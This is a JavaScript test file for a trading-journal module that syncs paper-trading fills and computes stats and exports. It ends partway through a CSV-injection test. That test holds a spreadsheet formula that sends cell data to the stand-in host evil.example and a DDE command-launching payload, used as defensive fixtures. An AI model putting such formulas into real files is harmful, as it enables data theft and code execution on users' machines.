/* Broward Trading — tests for js/journal.js (BT.journal)
 * Run with:  node tests/journal.test.js
 * Plain node + assert, no framework. `window` and `localStorage` are shimmed;
 * js/paper.js is loaded so auto-sync runs against real fills in two accounts.
 */
'use strict';
const assert = require('assert');
const path = require('path');

// ---- shims -------------------------------------------------------------
const store = {};
global.localStorage = {
  getItem(k) { return Object.prototype.hasOwnProperty.call(store, k) ? store[k] : null; },
  setItem(k, v) { store[k] = String(v); },
  removeItem(k) { delete store[k]; },
  clear() { Object.keys(store).forEach(k => delete store[k]); },
  key(i) { return Object.keys(store)[i] == null ? null : Object.keys(store)[i]; },
  get length() { return Object.keys(store).length; }
};
global.window = { localStorage: global.localStorage };
require(path.join(__dirname, '..', 'js', 'paper.js'));
require(path.join(__dirname, '..', 'js', 'journal.js'));
const P = window.BT.paper, J = window.BT.journal;

let passed = 0, failed = 0;
function test(name, fn) {
  try { fn(); passed++; console.log('  ok   ' + name); }
  catch (e) { failed++; console.log('  FAIL ' + name + '\n       ' + (e && e.stack ? e.stack.split('\n').slice(0, 8).join('\n       ') : e)); }
}
function near(a, b, tol, msg) { tol = tol == null ? 1e-6 : tol; assert.ok(Math.abs(a - b) <= tol, (msg || '') + ' expected ' + b + ' got ' + a); }

// A fixed "now": Wednesday 2024-03-06 15:00 local time (Date constructed locally so dayOf() matches).
let fakeNow = new Date(2024, 2, 6, 15, 0, 0).getTime();
P.setClock(() => fakeNow);
J.setClock(() => fakeNow);

function fresh() {
  fakeNow = new Date(2024, 2, 6, 15, 0, 0).getTime();
  localStorage.clear();
  P.use('main'); P.reset(100000); P.setSettings({ commission: 0 });
  J.reset();
}
/** Seed two accounts with fills: main has a win and a loss, replay has one open position. */
function seedPaper() {
  P.use('main');
  P.placeOrder({ symbol: 'AAPL', side: 'buy', qty: 10, type: 'market' }, 150);   // trade 1 open
  fakeNow += 3600e3;
  P.placeOrder({ symbol: 'AAPL', side: 'sell', qty: 10, type: 'market' }, 160);  // trade 2 close +100
  fakeNow += 3600e3;
  P.placeOrder({ symbol: 'MSFT', side: 'buy', qty: 5, type: 'market' }, 400);    // trade 3 open
  fakeNow += 3600e3;
  P.placeOrder({ symbol: 'MSFT', side: 'sell', qty: 5, type: 'market' }, 390);   // trade 4 close -50
  fakeNow += 3600e3;
  P.use('replay'); P.reset(100000);
  P.placeOrder({ symbol: 'SPY', side: 'buy', qty: 2, type: 'market' }, 500);     // replay trade 1 open
  P.use('main');
}
/** Find the synced entry for a fill by account, symbol and role (trade ids are shared with order ids in paper.js). */
function ent(acc, sym, role) { return J.entries().find(e => e.account === acc && e.symbol === sym && e.trade && e.trade.role === role); }

console.log('BT.journal tests');

/* ------------------------------------------------------------------ */
test('module exposes the contract surface and a fresh state', () => {
  ['load', 'save', 'reset', 'entries', 'get', 'add', 'update', 'remove', 'sync', 'filter', 'summary', 'groupStats', 'calendar',
    'weekKey', 'getReview', 'saveReview', 'exportJSON', 'exportCSV', 'importJSON', 'tagSuggestions', 'setupSuggestions', 'streaks']
    .forEach(f => assert.strictEqual(typeof J[f], 'function', f + ' missing'));
  assert.strictEqual(J.STORAGE_KEY, 'bt.journal');
  assert.ok(J.EMOTIONS.length >= 6 && J.EMOTIONS.every(e => e.id && e.label && e.help));
  assert.ok(J.SETUPS.length >= 10);
  assert.ok(J.REVIEW_CHECKLIST.length >= 5 && J.REVIEW_QUESTIONS.length >= 3);
  assert.ok(J.WHY.points.length >= 3);
  fresh();
  assert.deepStrictEqual(J.entries(), []);
  assert.deepStrictEqual(J.getState().reviews, {});
});

/* ---------------- manual entries ---------------------------------- */
test('add() normalises a manual entry: tags, emotion, clamped confidence/rating, date default', () => {
  fresh();
  const e = J.add({ symbol: ' nvda ', setup: 'Breakout', tags: ['Swing', 'swing', ' Followed Plan ', 'bad tag!!'], emotion: 'fomo', confidence: 9, rating: 0, notes: 'chased', pnl: 12.345 });
  assert.strictEqual(e.symbol, 'NVDA');
  assert.deepStrictEqual(e.tags, ['swing', 'followed-plan', 'bad-tag']);
  assert.strictEqual(e.emotion, 'fomo');
  assert.strictEqual(e.confidence, 3, 'out-of-range confidence falls back to 3');
  assert.strictEqual(e.rating, 3);
  assert.strictEqual(e.date, '2024-03-06');
  assert.strictEqual(e.source, 'manual');
  assert.strictEqual(e.pnl, 12.35);
  assert.strictEqual(J.entries().length, 1);
  assert.strictEqual(J.get(e.id).id, e.id);
  // persisted
  const saved = JSON.parse(localStorage.getItem('bt.journal'));
  assert.strictEqual(saved.version, 1);
  assert.strictEqual(saved.entries.length, 1);
});

test('add() rejects an empty entry; tags accept a comma string', () => {
  fresh();
  assert.strictEqual(J.add({}), null);
  assert.strictEqual(J.add({ tags: 'a, b' }), null, 'tags alone are not an entry');
  const e = J.add({ symbol: 'AAPL', tags: 'daily, long' });
  assert.deepStrictEqual(e.tags, ['daily', 'long']);
});

test('update() changes only the patched fields and bumps updatedAt; remove() deletes', () => {
  fresh();
  const e = J.add({ symbol: 'AAPL', setup: 'Breakout', notes: 'n', rating: 4 });
  fakeNow += 1000;
  const u = J.update(e.id, { lessons: 'wait for the retest', emotion: 'calm' });
  assert.strictEqual(u.setup, 'Breakout');
  assert.strictEqual(u.notes, 'n');
  assert.strictEqual(u.rating, 4);
  assert.strictEqual(u.lessons, 'wait for the retest');
  assert.strictEqual(u.emotion, 'calm');
  assert.ok(u.updatedAt > e.createdAt);
  assert.strictEqual(J.update('nope', { notes: 'x' }), null);
  assert.strictEqual(J.remove(e.id), true);
  assert.strictEqual(J.remove(e.id), false);
  assert.deepStrictEqual(J.entries(), []);
});

/* ---------------- auto-sync from BT.paper ---------------------------- */
test('sync() creates one entry per fill across every account, keyed by account:tradeId', () => {
  fresh(); seedPaper();
  const r = J.sync();
  assert.strictEqual(r.added, 5, 'four main fills + one replay fill');
  assert.ok(r.accounts.some(a => a.id === 'main') && r.accounts.some(a => a.id === 'replay'));
  const list = J.entries();
  assert.strictEqual(list.length, 5);
  list.forEach(e => assert.ok(/^(main|replay):\d+:\d+$/.test(e.tradeId), 'tradeId ' + e.tradeId + ' must be account:generation:id'));
  assert.strictEqual(new Set(list.map(e => e.tradeId)).size, 5, 'unique tradeIds');
  assert.strictEqual(list.filter(e => e.account === 'main').length, 4);
  const close = ent('main', 'AAPL', 'close');
  assert.strictEqual(close.symbol, 'AAPL');
  assert.strictEqual(close.pnl, 100);
  assert.strictEqual(close.trade.role, 'close');
  assert.ok(close.tags.includes('winner') && close.tags.includes('long') && close.tags.includes('main'));
  const open = ent('main', 'AAPL', 'open');
  assert.strictEqual(open.pnl, null);
  assert.strictEqual(open.trade.role, 'open');
  assert.ok(open.tags.includes('long'));
  const loss = ent('main', 'MSFT', 'close');
  assert.strictEqual(loss.pnl, -50);
  assert.ok(loss.tags.includes('loser'));
  assert.strictEqual(ent('replay', 'SPY', 'open').account, 'replay');
  assert.strictEqual(ent('replay', 'SPY', 'open').pnl, null);
  assert.strictEqual(P.account(), 'main', 'sync must not switch the active paper account');
});

test('sync() is idempotent and never overwrites student edits', () => {
  fresh(); seedPaper(); J.sync();
  const e = ent('main', 'AAPL', 'close');
  J.update(e.id, { setup: 'Trend pullback', emotion: 'calm', notes: 'textbook', tags: ['my-tag'] });
  const r = J.sync();
  assert.deepStrictEqual([r.added, r.updated], [0, 0]);
  const again = J.get(e.id);
  assert.strictEqual(again.setup, 'Trend pullback');
  assert.deepStrictEqual(again.tags, ['my-tag']);
  assert.strictEqual(again.pnl, 100);
});

test('a deleted synced entry stays deleted on the next sync (hidden tradeIds)', () => {
  fresh(); seedPaper(); J.sync();
  const e = ent('main', 'MSFT', 'open');
  J.remove(e.id);
  assert.strictEqual(J.sync().added, 0);
  assert.strictEqual(J.entries().length, 4);
  assert.ok(J.getState().hidden.includes(e.tradeId));
});

test('sync() picks up new fills and survives a paper reset (entries keep their copied trade block)', () => {
  fresh(); seedPaper(); J.sync();
  P.placeOrder({ symbol: 'TSLA', side: 'buy', qty: 1, type: 'market' }, 200);
  assert.strictEqual(J.sync().added, 1);
  P.reset(100000);
  assert.strictEqual(J.sync().added, 0);
  assert.strictEqual(J.entries().length, 6, 'history is preserved after the account was reset');
  assert.strictEqual(ent('main', 'AAPL', 'close').trade.price, 160);
});

test('tradeIds are unique per account generation: a later replay/reset session never overwrites an earlier one', () => {
  fresh();
  // session 1 on the replay account: MSFT round trip +100, annotated by the student
  P.use('replay'); P.reset(100000); P.setSettings({ commission: 0 });
  P.placeOrder({ symbol: 'MSFT', side: 'buy', qty: 10, type: 'market' }, 400); fakeNow += 60e3;
  P.placeOrder({ symbol: 'MSFT', side: 'sell', qty: 10, type: 'market' }, 410); fakeNow += 60e3;
  P.use('main');
  assert.strictEqual(J.sync().added, 2);
  const msftClose = ent('replay', 'MSFT', 'close');
  J.update(msftClose.id, { setup: 'Breakout', lessons: 'nice trade' });
  // session 2: paper.reset() restarts trade ids at 1; TSLA round trip −250
  fakeNow += 60e3;
  P.use('replay'); P.reset(100000);
  P.placeOrder({ symbol: 'TSLA', side: 'buy', qty: 10, type: 'market' }, 200); fakeNow += 60e3;
  P.placeOrder({ symbol: 'TSLA', side: 'sell', qty: 10, type: 'market' }, 175); fakeNow += 60e3;
  P.use('main');
  const r = J.sync();
  assert.deepStrictEqual([r.added, r.updated], [2, 0], 'second session adds, never updates');
  const list = J.entries();
  assert.strictEqual(list.length, 4);
  assert.strictEqual(new Set(list.map(e => e.tradeId)).size, 4);
  const kept = J.get(msftClose.id);
  assert.strictEqual(kept.symbol, 'MSFT'); assert.strictEqual(kept.trade.price, 410);
  assert.strictEqual(kept.setup, 'Breakout'); assert.strictEqual(kept.lessons, 'nice trade', 'notes stay on the MSFT trade');
  assert.strictEqual(ent('replay', 'TSLA', 'close').trade.realized, -250);
  assert.ok(ent('replay', 'TSLA', 'close').setup === '', 'the new fill is unannotated');
  // the same holds on main after Reset account
  P.placeOrder({ symbol: 'AAPL', side: 'buy', qty: 1, type: 'market' }, 100);
  J.sync();
  const aaplOpen = ent('main', 'AAPL', 'open');
  J.remove(aaplOpen.id);                                     // hidden under the generation key
  P.reset(100000);
  P.placeOrder({ symbol: 'NVDA', side: 'buy', qty: 1, type: 'market' }, 900);   // trade id 1 again
  assert.strictEqual(J.sync().added, 1, 'a hidden fill in the old generation does not hide the new one');
  assert.ok(ent('main', 'NVDA', 'open'));
});

test('legacy account:id keys are migrated when the copied fill matches, and never claim a different fill', () => {
  fresh(); seedPaper(); J.sync();
  // rewrite the stored journal to the pre-generation key format
  const saved = JSON.parse(localStorage.getItem('bt.journal'));
  saved.entries.forEach(e => { e.tradeId = e.tradeId.replace(/^(\w+):\d+:(\d+)$/, '$1:$2'); });
  saved.entries.find(e => e.symbol === 'AAPL' && e.trade.role === 'close').lessons = 'kept';
  const msftLegacy = saved.entries.find(e => e.symbol === 'MSFT' && e.trade.role === 'close').tradeId;
  saved.hidden = [msftLegacy];                               // the MSFT close was deleted under the old key
  saved.entries = saved.entries.filter(e => e.tradeId !== msftLegacy);
  localStorage.setItem('bt.journal', JSON.stringify(saved));
  J.load();
  assert.ok(J.entries().every(e => /^\w+:\d+$/.test(e.tradeId)));
  const r = J.sync();
  assert.deepStrictEqual([r.added, r.updated], [0, 0], 'matching fills are re-keyed, not duplicated');
  assert.strictEqual(J.entries().length, 4);
  assert.ok(J.entries().every(e => /^\w+:\d+:\d+$/.test(e.tradeId)), 'all keys carry the generation now');
  assert.strictEqual(J.entries().find(e => e.symbol === 'AAPL' && e.trade.role === 'close').lessons, 'kept');
  assert.deepStrictEqual(J.getState().hidden, [msftLegacy.replace(/^main:/, 'main:' + JSON.parse(localStorage.getItem('bt.portfolio')).createdAt + ':')], 'hidden legacy key pinned to the current generation');
  assert.strictEqual(J.sync().added, 0, 'MSFT close stays deleted');
  // a legacy key whose copied fill differs (another session's trade) is left alone and the fill is journaled anew
  J.add({ symbol: 'ZZZ', tradeId: 'replay:1', account: 'replay', source: 'paper', trade: { side: 'buy', qty: 99, price: 1, openedQty: 99, time: 1 } });
  const saved2 = JSON.parse(localStorage.getItem('bt.journal'));
  saved2.entries = saved2.entries.filter(e => !(e.account === 'replay' && e.symbol === 'SPY'));
  localStorage.setItem('bt.journal', JSON.stringify(saved2)); J.load();
  assert.strictEqual(J.sync().added, 1, 'SPY fill is new; the ZZZ legacy entry did not match it');
  assert.strictEqual(J.entries().find(e => e.symbol === 'ZZZ').tradeId, 'replay:1');
});

test('replay P&L is counted once: scorecard carries it, synced replay fills have pnl null', () => {
  fresh();
  P.use('replay'); P.reset(100000); P.setSettings({ commission: 0 });
  P.placeOrder({ symbol: 'MSFT', side: 'buy', qty: 10, type: 'market' }, 400); fakeNow += 60e3;
  P.placeOrder({ symbol: 'MSFT', side: 'sell', qty: 10, type: 'market' }, 410); fakeNow += 60e3;
  P.use('main');
  // what js/replay.js saveToJournal() writes for the session
  const j = JSON.parse(localStorage.getItem('bt.journal'));
  j.entries.push({ id: 'jr-s1', tradeId: null, source: 'replay', symbol: 'MSFT', date: '2024-03-06', setup: 'Market Replay: MSFT 1day', tags: ['replay'],
    emotion: '', confidence: 3, notes: 'summary', lessons: '', rating: 4, replay: { equity: 100100, startingCash: 100000, trades: 1, returnPct: 0.1 }, createdAt: fakeNow, updatedAt: fakeNow });
  localStorage.setItem('bt.journal', JSON.stringify(j));
  J.load(); J.sync();
  const all = J.entries();
  assert.strictEqual(all.length, 3);
  const s = J.summary(all);
  assert.strictEqual(s.total, 100, 'one replay round trip counts +100 once');
  assert.strictEqual(s.closed, 1); assert.strictEqual(s.wins, 1);
  const close = ent('replay', 'MSFT', 'close');
  assert.strictEqual(close.pnl, null);
  assert.strictEqual(close.trade.realized, 100, 'the fill keeps its realized figure for display');
  assert.ok(close.tags.includes('winner'));
  assert.strictEqual(J.groupStats(all, 'symbol').find(g => g.key === 'MSFT').total, 100);
  // a legacy synced replay fill saved with a P&L is corrected on load/sync, and a student edit cannot re-add one
  const j2 = JSON.parse(localStorage.getItem('bt.journal'));
  j2.entries.find(e => e.id === close.id).pnl = 100;
  localStorage.setItem('bt.journal', JSON.stringify(j2)); J.load();
  assert.strictEqual(J.get(close.id).pnl, null, 'load() normalises it away');
  assert.strictEqual(J.update(close.id, { pnl: 55 }).pnl, null);
  // fills on main still carry P&L
  P.placeOrder({ symbol: 'AAPL', side: 'buy', qty: 1, type: 'market' }, 100); fakeNow += 60e3;
  P.placeOrder({ symbol: 'AAPL', side: 'sell', qty: 1, type: 'market' }, 90);
  J.sync();
  assert.strictEqual(J.summary(J.entries()).total, 90);
});

test('sync() reads the persisted main account, so fills written by another tab are journaled without a reload', () => {
  fresh();
  assert.strictEqual(P.account(), 'main');
  // "another tab" appends a fill to bt.portfolio; this tab's in-memory paper state is stale
  const st = JSON.parse(localStorage.getItem('bt.portfolio'));
  st.trades.push({ id: 1, symbol: 'AAPL', side: 'buy', qty: 10, price: 150, realized: 0, closedQty: 0, openedQty: 10, kind: 'stock', time: fakeNow, value: 1500 });
  st.nextId = 2;
  localStorage.setItem('bt.portfolio', JSON.stringify(st));
  assert.strictEqual(P.getState().trades.length, 0, 'memory is stale by construction');
  const r = J.sync();
  assert.strictEqual(r.added, 1);
  assert.strictEqual(ent('main', 'AAPL', 'open').trade.price, 150);
  assert.strictEqual(r.accounts.find(a => a.id === 'main').createdAt, st.createdAt);
  P.load();
  assert.strictEqual(J.sync().added, 0, 'in sync once this tab reloads paper too');
});

/* ---------------- replay.js interop ---------------------------------- */
test('load() accepts a bare array written by js/replay.js and a replay entry counts toward P&L', () => {
  localStorage.clear(); P.reset();
  localStorage.setItem('bt.journal', JSON.stringify([{
    id: 'jr-abc', tradeId: null, source: 'replay', symbol: 'MSFT', date: '2024-02-20', setup: 'Market Replay: MSFT 1day',
    tags: ['replay', 'MSFT', '1day', 'winner'], emotion: '', confidence: 3, notes: 'summary', lessons: '', rating: 4,
    replay: { returnPct: 2.5, equity: 102500, startingCash: 100000, trades: 3 }, createdAt: 1, updatedAt: 1
  }]));
  J.load();
  const list = J.entries();
  assert.strictEqual(list.length, 1);
  assert.strictEqual(list[0].source, 'replay');
  assert.strictEqual(list[0].pnl, 2500, 'replay equity − startingCash becomes the entry P&L');
  assert.deepStrictEqual(list[0].tags, ['replay', 'msft', '1day', 'winner']);
  J.save();
  const saved = JSON.parse(localStorage.getItem('bt.journal'));
  assert.ok(Array.isArray(saved.entries) && saved.version === 1, 'migrated to the object shape (which replay.js also writes into)');
});

test('load() drops corrupt rows and duplicate ids', () => {
  localStorage.clear();
  localStorage.setItem('bt.journal', JSON.stringify({ entries: [null, 5, { id: 'a', symbol: 'AAPL' }, { id: 'a', symbol: 'MSFT' }, { notes: 'x' }], reviews: { 'bad-key': { checks: {} } } }));
  J.load();
  assert.strictEqual(J.entries().length, 2);
  assert.strictEqual(J.entries().filter(e => e.id === 'a').length, 1);
  assert.deepStrictEqual(J.getState().reviews, {});
});

/* ---------------- ordering & filters ------------------------------- */
test('entries() sorts newest first and filter() supports every documented key', () => {
  fresh(); seedPaper(); J.sync();
  J.add({ symbol: 'AMD', date: '2024-01-15', setup: 'Gap fill', tags: ['swing'], emotion: 'fomo', pnl: -20, notes: 'late entry on the gap' });
  const all = J.entries();
  assert.strictEqual(all[0].date, '2024-03-06');
  assert.strictEqual(all[all.length - 1].symbol, 'AMD');
  // within one day, latest fill first
  assert.strictEqual(all[0].symbol, 'SPY');
  assert.strictEqual(J.filter(all, { account: 'replay' }).length, 1);
  assert.strictEqual(J.filter(all, { symbol: 'aapl' }).length, 2);
  assert.strictEqual(J.filter(all, { tag: 'winner' }).length, 1);
  assert.strictEqual(J.filter(all, { outcome: 'win' }).length, 1);
  assert.strictEqual(J.filter(all, { outcome: 'loss' }).length, 2);
  assert.strictEqual(J.filter(all, { outcome: 'closed' }).length, 3);
  assert.strictEqual(J.filter(all, { outcome: 'open' }).length, 3);
  assert.strictEqual(J.filter(all, { emotion: 'fomo' }).length, 1);
  assert.strictEqual(J.filter(all, { setup: 'Gap fill' }).length, 1);
  assert.strictEqual(J.filter(all, { source: 'manual' }).length, 1);
  assert.strictEqual(J.filter(all, { from: '2024-03-01', to: '2024-03-31' }).length, 5);
  assert.strictEqual(J.filter(all, { q: 'late entry' }).length, 1);
  assert.strictEqual(J.filter(all, { reviewed: true }).length, 1);
  assert.strictEqual(J.filter(all, { reviewed: false }).length, 5);
  assert.strictEqual(J.entries({ symbol: 'MSFT' }).length, 2);
});

/* ---------------- statistics --------------------------------------- */
test('summary(): win rate, averages, expectancy, profit factor, best/worst, reviewed %', () => {
  fresh();
  J.add({ symbol: 'A', pnl: 100, setup: 's', emotion: 'calm' });
  J.add({ symbol: 'B', pnl: 300, setup: 's', emotion: 'calm' });
  J.add({ symbol: 'C', pnl: -100 });
  J.add({ symbol: 'D', pnl: -200 });
  J.add({ symbol: 'E' });                       // open / no P&L
  const s = J.summary(J.entries());
  assert.strictEqual(s.count, 5);
  assert.strictEqual(s.closed, 4);
  assert.strictEqual(s.wins, 2); assert.strictEqual(s.losses, 2);
  assert.strictEqual(s.winRate, 50);
  assert.strictEqual(s.total, 100);
  assert.strictEqual(s.avgPnl, 25);
  assert.strictEqual(s.avgWin, 200);
  assert.strictEqual(s.avgLoss, 150);
  near(s.expectancy, 0.5 * 200 - 0.5 * 150);  // 25 = avgPnl, as it must
  near(s.profitFactor, 400 / 300, 0.01);
  assert.strictEqual(s.best.symbol, 'B');
  assert.strictEqual(s.worst.symbol, 'D');
  assert.strictEqual(s.reviewedPct, 40);
  assert.strictEqual(s.avgRating, 3);
});

test('summary() of an empty list is all-null/zero, never NaN', () => {
  fresh();
  const s = J.summary([]);
  assert.strictEqual(s.count, 0); assert.strictEqual(s.winRate, null); assert.strictEqual(s.expectancy, null);
  assert.strictEqual(s.avgPnl, null); assert.strictEqual(s.profitFactor, null); assert.strictEqual(s.total, 0);
  Object.keys(s).forEach(k => assert.ok(!(typeof s[k] === 'number' && isNaN(s[k])), k + ' is NaN'));
});

test('groupStats(): by tag (multi-membership), setup, emotion (keeps not-set), symbol, weekday', () => {
  fresh();
  J.add({ symbol: 'A', date: '2024-03-04', pnl: 100, setup: 'Breakout', emotion: 'calm', tags: ['swing', 'long'] });
  J.add({ symbol: 'B', date: '2024-03-05', pnl: -40, setup: 'Breakout', emotion: 'fomo', tags: ['swing'] });
  J.add({ symbol: 'A', date: '2024-03-05', pnl: 80, setup: 'Mean reversion', tags: [] });
  const byTag = J.groupStats(J.entries(), 'tag');
  const swing = byTag.find(g => g.key === 'swing');
  assert.strictEqual(swing.count, 2); assert.strictEqual(swing.total, 60); assert.strictEqual(swing.winRate, 50);
  assert.strictEqual(byTag.find(g => g.key === 'long').count, 1);
  const bySetup = J.groupStats(J.entries(), 'setup');
  assert.strictEqual(bySetup[0].key, 'Mean reversion', 'sorted by total P&L desc');
  assert.strictEqual(bySetup.find(g => g.key === 'Breakout').total, 60);
  const byEmotion = J.groupStats(J.entries(), 'emotion');
  assert.ok(byEmotion.some(g => g.key === '' && g.label === '(not set)' && g.count === 1));
  assert.strictEqual(byEmotion.find(g => g.key === 'fomo').label, 'FOMO');
  const bySym = J.groupStats(J.entries(), 'symbol');
  assert.strictEqual(bySym.find(g => g.key === 'A').count, 2);
  const byDay = J.groupStats(J.entries(), 'weekday');
  assert.strictEqual(byDay.find(g => g.key === 'Tuesday').count, 2);
  assert.strictEqual(byDay.find(g => g.key === 'Monday').total, 100);
});

test('calendar(): whole weeks ending on a Saturday, daily P&L aggregated, max for the colour scale', () => {
  fresh();
  J.add({ symbol: 'A', date: '2024-03-04', pnl: 100 });
  J.add({ symbol: 'A', date: '2024-03-04', pnl: -30 });
  J.add({ symbol: 'B', date: '2024-03-05' });
  const c = J.calendar(J.entries(), { weeks: 4, end: '2024-03-06' });
  assert.strictEqual(c.days.length, 28);
  assert.strictEqual(c.end, '2024-03-09', 'extended to Saturday');
  assert.strictEqual(c.start, '2024-02-11', 'a Sunday 4 weeks earlier');
  const mon = c.days.find(d => d.date === '2024-03-04');
  assert.deepStrictEqual(mon, { date: '2024-03-04', pnl: 70, count: 2, closed: 2 });
  const tue = c.days.find(d => d.date === '2024-03-05');
  assert.deepStrictEqual(tue, { date: '2024-03-05', pnl: 0, count: 1, closed: 0 });
  assert.strictEqual(c.max, 70);
});

test('streaks(): current and longest win/loss runs in time order', () => {
  fresh(); seedPaper(); J.sync();            // +100 then −50 in time order
  const s = J.streaks(J.entries());
  assert.deepStrictEqual(s.current, { kind: 'loss', n: 1 });
  assert.strictEqual(s.longestWin, 1); assert.strictEqual(s.longestLoss, 1);
  assert.deepStrictEqual(J.streaks([]).current, { kind: null, n: 0 });
});

test('tagSuggestions()/setupSuggestions() put the journal\'s own values first, then built-ins', () => {
  fresh();
  J.add({ symbol: 'A', tags: ['zeta', 'alpha'], setup: 'My own setup' });
  J.add({ symbol: 'B', tags: ['zeta'] });
  const tags = J.tagSuggestions();
  assert.deepStrictEqual(tags.slice(0, 2), ['zeta', 'alpha']);
  assert.ok(tags.includes('followed-plan'));
  assert.strictEqual(new Set(tags).size, tags.length, 'no duplicates');
  const setups = J.setupSuggestions();
  assert.strictEqual(setups[0], 'My own setup');
  assert.ok(setups.includes('Breakout'));
});

/* ---------------- weekly review ------------------------------------ */
test('weekKey() is the Monday of the week (Sunday belongs to the week before)', () => {
  assert.strictEqual(J.weekKey('2024-03-06'), '2024-03-04'); // Wednesday
  assert.strictEqual(J.weekKey('2024-03-04'), '2024-03-04'); // Monday
  assert.strictEqual(J.weekKey('2024-03-10'), '2024-03-04'); // Sunday
  assert.strictEqual(J.weekKey('2024-03-11'), '2024-03-11');
  assert.deepStrictEqual(J.weekRange('2024-03-07'), { from: '2024-03-04', to: '2024-03-10', key: '2024-03-04' });
  assert.strictEqual(J.weekKey(), '2024-03-04', 'defaults to the current week');
});

test('saveReview()/getReview() persist checks and answers; empty review is removed; weekSummary scopes P&L', () => {
  fresh();
  const blank = J.getReview('2024-03-06');
  assert.strictEqual(blank.done, 0); assert.strictEqual(blank.complete, false); assert.strictEqual(blank.savedAt, null);
  const r = J.saveReview('2024-03-06', { checks: { all_logged: true, plan: true, bogus: true }, answers: { went_well: '  kept stops  ', nope: 'x' } });
  assert.strictEqual(r.key, '2024-03-04');
  assert.strictEqual(r.done, 2);
  assert.deepStrictEqual(r.checks, { all_logged: true, plan: true });
  assert.deepStrictEqual(r.answers, { went_well: 'kept stops' });
  assert.deepStrictEqual(J.reviewWeeks(), ['2024-03-04']);
  J.load();
  assert.strictEqual(J.getReview('2024-03-04').done, 2, 'survives reload');
  const all = {}; J.REVIEW_CHECKLIST.forEach(c => all[c.id] = true);
  const ans = {}; J.REVIEW_QUESTIONS.forEach(q => ans[q.id] = 'yes');
  assert.strictEqual(J.saveReview('2024-03-04', { checks: all, answers: ans }).complete, true);
  J.saveReview('2024-03-04', { checks: {}, answers: {} });
  assert.deepStrictEqual(J.reviewWeeks(), []);
  J.add({ symbol: 'A', date: '2024-03-05', pnl: 50 });
  J.add({ symbol: 'B', date: '2024-02-27', pnl: -500 });
  assert.strictEqual(J.weekSummary('2024-03-06').total, 50);
  assert.strictEqual(J.weekSummary('2024-02-27').total, -500);
});

/* ---------------- export / import ---------------------------------- */
test('exportJSON() round-trips through importJSON() in merge and replace mode', () => {
  fresh(); seedPaper(); J.sync();
  const e = J.entries()[0];
  J.update(e.id, { notes: 'keep me', tags: ['x'] });
  J.saveReview('2024-03-06', { checks: { plan: true }, answers: { went_well: 'ok' } });
  const json = J.exportJSON();
  const parsed = JSON.parse(json);
  assert.strictEqual(parsed.kind, 'journal');
  assert.strictEqual(parsed.entries.length, 5);
  assert.ok(parsed.reviews['2024-03-04']);
  // merge into the same journal: nothing new
  let r = J.importJSON(json);
  assert.deepStrictEqual([r.added, r.errors.length], [0, 0]);
  assert.strictEqual(J.entries().length, 5);
  // replace into an empty journal
  J.reset();
  r = J.importJSON(json, { mode: 'replace' });
  assert.strictEqual(r.added, 5); assert.strictEqual(r.reviews, 1);
  assert.strictEqual(J.get(e.id).notes, 'keep me');
  assert.strictEqual(J.getReview('2024-03-04').done, 1);
  // newer import wins, older is skipped
  const older = JSON.parse(json); older.entries = [Object.assign({}, older.entries[0], { notes: 'stale', updatedAt: 1 })];
  r = J.importJSON(JSON.stringify(older));
  assert.strictEqual(r.skipped, 1); assert.strictEqual(J.get(e.id).notes, 'keep me');
  const newer = JSON.parse(json); newer.entries = [Object.assign({}, newer.entries[0], { notes: 'fresh', updatedAt: fakeNow + 99 })];
  r = J.importJSON(JSON.stringify(newer));
  assert.strictEqual(r.updated, 1); assert.strictEqual(J.get(e.id).notes, 'fresh');
});

test('importJSON() reports bad input instead of throwing', () => {
  fresh();
  assert.ok(/Nothing to import/.test(J.importJSON('').errors[0]));
  assert.ok(/not valid JSON/.test(J.importJSON('{oops').errors[0]));
  assert.ok(/No entries/.test(J.importJSON('{"foo":1}').errors[0]));
  assert.ok(J.importJSON('hello world').errors.length === 1);
  const r = J.importJSON('[{"symbol":"AAPL"},{},{"notes":"n"}]');
  assert.strictEqual(r.added, 2); assert.strictEqual(r.skipped, 1);
  assert.strictEqual(J.entries().length, 2);
});

test('exportCSV() quotes commas, quotes and newlines; parseCSV()/importJSON() read it back', () => {
  fresh();
  const e = J.add({ symbol: 'AAPL', date: '2024-03-01', setup: 'Breakout, retest', notes: 'He said "go"\nthen left', tags: ['a', 'b'], pnl: -12.5, emotion: 'calm', confidence: 4, rating: 2, trade: { side: 'sell', qty: 10, price: 150, role: 'close', closedQty: 10, realized: -12.5 } });
  const csv = J.exportCSV();
  const lines = csv.split('\r\n');
  assert.strictEqual(lines[0], J.CSV_COLUMNS.join(','));
  assert.ok(csv.includes('"Breakout, retest"'));
  assert.ok(csv.includes('"He said ""go""\nthen left"'));
  const rows = J.parseCSV(csv);
  assert.strictEqual(rows.length, 1);
  assert.strictEqual(rows[0].setup, 'Breakout, retest');
  assert.strictEqual(rows[0].notes, 'He said "go"\nthen left');
  assert.strictEqual(rows[0].tags, 'a b');
  assert.strictEqual(rows[0].pnl, '-12.5');
  J.reset();
  const r = J.importJSON(csv);
  assert.strictEqual(r.added, 1);
  const back = J.get(e.id);
  assert.strictEqual(back.symbol, 'AAPL'); assert.strictEqual(back.pnl, -12.5); assert.deepStrictEqual(back.tags, ['a', 'b']);
  assert.strictEqual(back.confidence, 4); assert.strictEqual(back.rating, 2); assert.strictEqual(back.trade.side, 'sell'); assert.strictEqual(back.trade.qty, 10);
});

test('exportCSV() neutralises spreadsheet formulas in free text and the guard is stripped on re-import', () => {
  fresh();
  const evil = '=HYPERLINK("https://evil.example/?"&A1,"Open trade")';
  const e = J.add({ symbol: 'AAPL', setup: "=cmd|' /C calc'!A0", notes: evil, lessons: '-50 was my stop, then +20', tags: ['a'], pnl: -12.5, emotion: 'calm' });
  J.add({ symbol: 'MSFT', notes: '@mention and\ttab', lessons: 'plain text' });
  const csv = J.exportCSV();
  const body = csv.split('\r\n').slice(1);
  body.forEach(line => J.parseCSV(csv.split('\r\n')[0] + '\r\n' + line));
  const rows = J.parseCSV(csv);
  const numeric = ['qty', 'price', 'pnl', 'confidence', 'rating'];
  const cells = rows.flatMap(r => Object.keys(r).filter(k => numeric.indexOf(k) === -1).map(k => r[k]));
  cells.forEach(c => assert.ok(!/^[=+\-@\t\r]/.test(c), 'cell starts with a formula character: ' + JSON.stringify(c)));
  const r1 = rows.find(r => r.symbol === 'AAPL');
  assert.strictEqual(r1.notes, "'" + evil);
  assert.strictEqual(r1.setup, "'=cmd|' /C calc'!A0");
  assert.strictEqual(r1.lessons, "'-50 was my stop, then +20");
  assert.strictEqual(r1.pnl, '-12.5', 'numeric columns are not guarded');
